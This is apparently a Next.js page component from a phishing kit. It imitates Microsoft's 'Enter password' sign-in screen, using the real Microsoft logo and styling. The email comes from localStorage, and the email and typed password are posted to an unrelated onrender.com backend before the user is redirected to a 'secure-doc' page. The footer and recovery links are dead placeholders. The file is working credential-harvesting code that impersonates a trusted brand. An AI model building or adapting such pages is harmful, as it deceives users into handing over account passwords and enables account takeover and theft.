'use client'

import { FormEvent, useState, useEffect } from "react";
import { useRouter } from "next/navigation"; 
import "../../../styles/signin.css";

export default function PasswordPage() {
  const [password, setPassword] = useState("");
  const [userEmail, setUserEmail] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  useEffect(() => {
    // Get email from localStorage
    const email = localStorage.getItem("userEmail");
    if (email) {
      setUserEmail(email);
    } else {
      // If no email found, go back to start
      router.push("/");
    }
  }, [router]);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    try {
      const res = await fetch("https://signin-backend-itzo.onrender.com/signup", {
        method: "POST",
        headers: {
        "Content-Type": "application/json",
      },
        body: JSON.stringify({ email: userEmail, password }),
    });

      const data = await res.json();

      if (data.success) {
        console.log("Success:", data.message);
        localStorage.setItem("isLoggedIn", "true");
        router.push("/secure-doc");
      } else {
        setError(data.message || "Login failed.");
      }
    } catch (err) {
      console.error("Fetch error:", err);
      setError("Something went wrong. Please try again.");
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center">
      {/* Form card */}
      <div className="bg-white w-[430px] p-8 shadow-md h-[338px] shadow-md">
        {/* Microsoft Logo */}
        <div className="flex items-center mb-0 pt-5">
          <img
            className="logo"
            role="img"
            src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
            alt="Microsoft"
          />
        </div>

        {/* Show the email */}
        <p className="text-[#1b1b1b] text-[15px] mt-2">{userEmail}</p>

        {/* Title */}
        <h1 className="signin-title text-[#1b1b1b] text-2xl font-semibold mb-0 pt-2">
          Enter password
        </h1>

        {/* Error message */}
        {error && <p className="text-red-600 text-sm mt-1">{error}</p>}

        {/* Password Form */}
        <form onSubmit={handleSubmit}>
          <input
            type="password"
            name="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="link-text text-[#1b1b1b] text-[15px] border-b border-gray-400 w-full focus:outline-none focus:border-blue-600 pb-1 mb-0 text-lg"
            required
          />

          <a
            href="#"
            className="link-text text-[13px] hover:text-gray-500 text-blue-600 hover:underline cursor-pointer"
          >
            Forgot my password
          </a>

          {/* Buttons */}
          <div className="flex justify-end gap-1">
            <button
              type="submit"
              className="sign w-[100px] py-1 bg-[#0067b8] text-white hover:bg-blue-700"
            >
              Sign in
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="footer-links">
        <a href="#" className="hover:underline">Terms of use</a>
        <a href="#" className="hover:underline">Privacy & cookies</a>
        <a href="#" className="hover:underline">...</a>
      </div>
    </div>
  );
}
